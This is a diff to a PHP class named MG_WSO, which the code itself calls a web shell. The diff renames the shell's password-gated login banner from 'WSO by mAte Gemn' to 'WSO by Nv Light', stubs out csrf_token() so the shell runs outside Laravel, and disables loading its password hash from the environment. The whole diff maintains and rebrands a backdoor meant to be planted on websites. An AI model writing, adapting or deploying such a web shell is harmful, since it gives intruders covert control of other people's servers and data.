@@ -227,7 +227,8 @@ Class MG_WSO
 			$_SESSION['logined'] = 0;
 		}
 
-		$this->▛ = env('APP_DBG_SH_MD5_HASH');
+		// for laravel env config dummy
+		//$this->▛ = env('APP_DBG_SH_MD5_HASH');
 
 		//--------------Watching webshell!----------------
 		if (array_key_exists('watching', $_POST))
@@ -239,6 +240,11 @@ Class MG_WSO
 		$this->disable_functions = $this->getIniGet('disable_functions');
 
 		//csrf_token();
+		if (!function_exists('csrf_token')){
+			function csrf_token(){
+				return 'random_str';
+			}
+		}
 		$token = csrf_token();
 		$this->csrf = <<<CSRF
 <input type="hidden" name="_token" value="{$token}">
@@ -426,7 +432,7 @@ CSRF;
 				exit;
 			}
 		}
-		die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Hello <br>WSO by mAte Gemn</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'>
+		die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Hello <br>WSO by Nv Light</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'>
 $this->csrf
 </form></pre>
 <div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>
